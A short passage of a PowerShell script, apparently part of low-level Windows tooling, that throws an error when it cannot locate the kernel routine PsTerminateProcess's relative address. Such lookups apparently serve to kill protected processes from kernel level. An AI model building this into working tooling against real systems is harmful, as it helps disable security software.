         if ($RVA -eq $null -or $RVA -le 0) {
             throw "Could not locate PsTerminateProcess RVA"
         }
